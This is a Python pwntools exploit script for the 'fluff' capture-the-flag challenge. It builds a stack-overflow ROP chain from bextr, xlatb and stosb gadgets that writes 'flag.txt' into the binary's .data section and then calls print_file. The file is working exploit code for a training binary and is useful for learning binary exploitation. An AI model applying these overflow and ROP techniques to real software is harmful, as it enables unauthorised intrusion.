from pwn import *

context.log_level = "debug"
context.terminal = ["wezterm", "start", "--"]

bin = "./fluff"
p = process(bin)
# gdb.attach(p, api=True)
e = ELF(bin)
rop = ROP(e)

"""
"""

# NOTE: `pwntools` can only find simple gadgets, see:
# <https://github.com/Gallopsled/pwntools/issues/1492>. So, we instead hardcode

# 0x000000000040062a: pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret;
pop_rdx_pop_rcx_add_rcx_3ef2_bextr_rbx_rcx_rdx_ret_addr = 0x40062A
# 0x0000000000400628 : xlatb ; ret
xlatb_ret_addr = 0x400628
# 0x0000000000400639 : stosb byte ptr [rdi], al ; ret
stosb_rdi_al_ret_addr = 0x400639
# 0x00000000004006a3 : pop rdi ; ret
pop_rdi_ret_addr = rop.find_gadget(["pop rdi", "ret"]).address
# 0x0000000000400610 : mov eax, 0 ; pop rbp ; ret
mov_eax_0_pop_rbp_ret_addr = 0x400610

# For stack alignment
ret_addr = rop.find_gadget(["ret"]).address

# The `sh_addr` is a standard field in an ELF section header.
# It's the virtual address of the section at runtime.
data_section_addr = e.get_section_by_name(".data").header.sh_addr

print_file_plt = e.plt["print_file"]

flag_str = b"flag.txt"

payload = b"A" * 32
payload += b"B" * 8  # Saved RBP

# Write `data_section_addr` to RDI.
payload += p64(pop_rdi_ret_addr)
payload += p64(data_section_addr)

# Zero out AL.
payload += p64(mov_eax_0_pop_rbp_ret_addr)
payload += p64(0xDEADBEEFDEADBEEF)  # Junk for RBP

prev_al = 0
for ch in flag_str:
    # Find each character in the memory segment for `fluff`.
    ch_addr = next(e.search(p8(ch)))
    # info(f"Found '{chr(i)}' at: '{hex(c)}'")

    payload += p64(pop_rdx_pop_rcx_add_rcx_3ef2_bextr_rbx_rcx_rdx_ret_addr)
    # Write index (0-7) + length (8-15) into source -> RDX
    payload += p64(0xFF00)
    # Write source character, adjusting for `add rcx, 0x3ef2;` -> RCX
    payload += p64(ch_addr - 0x3EF2 - prev_al)
    # Now RBX has our flag character!

    # Set AL to [RBX + AL] (AL is 0 from when we zeroed it above).
    payload += p64(xlatb_ret_addr)
    # Now AL has our flag character!
    payload += p64(stosb_rdi_al_ret_addr)
    # Now *current* RDI has our flag character and RDI is auto incremented.

    prev_al = ch


# Write `data_section_addr` to RDI again (since current RDI was auto incremented)
payload += p64(pop_rdi_ret_addr)
payload += p64(data_section_addr)
# debug(f"pop_rdi_ret_addr = {hex(pop_rdi_ret_addr)}")
# debug(f"data_section_addr = {hex(data_section_addr)}")
# payload += p64(ret_addr)  # Align stack
# Call `print_file()`
payload += p64(print_file_plt)

# pause()
p.sendafter(b"> ", payload)
p.recvline()
